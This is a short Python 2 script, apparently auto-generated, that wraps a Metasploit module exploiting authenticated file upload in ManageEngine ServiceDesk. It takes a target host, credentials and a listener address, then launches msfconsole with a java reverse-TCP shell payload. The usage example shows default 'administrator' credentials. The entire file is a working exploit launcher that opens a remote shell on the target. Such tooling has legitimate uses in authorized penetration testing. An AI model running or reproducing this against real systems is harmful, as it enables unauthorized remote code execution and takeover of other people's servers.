#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
# manageengine_sd_uploader_msf                                                                              #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Auto generated by msf_gen.py                                                                              #
#                                                                                                           #
#############################################################################################################

import signal
import sys
import os

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def exploit():

   command = """msfconsole -x "use exploit/multi/http/manageengine_auth_upload;set USERNAME %s;set PASSWORD %s;set RHOST %s;set RPORT %s;set PAYLOAD java/shell_reverse_tcp;set LHOST %s;set LPORT %s" """ % (USERNAME, PASSWORD, HOST, PORT, LHOST, LPORT)
   os.system(command)

def print_usage():
   print ("""manageengine_sd_uploader_msf""")

   print("Usage: %s <HOST>:<PORT> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
   print("EXAMPLE: manageengine_sd_uploader_msf.py '127.0.0.1:8080' 10.100.12.xx 1337 administrator administrator\n")
   sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 6:
       print_usage()

    HOST = sys.argv[1]
    if ':' in HOST:
      (HOST, PORT) = HOST.split(':')
    else:
      PORT = '8080'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    if os.path.isfile('/usr/bin/msfconsole') is False:
       print('ERROR: Please install metasploit for run this PoC.')
       sys.exit(1)

    exploit()
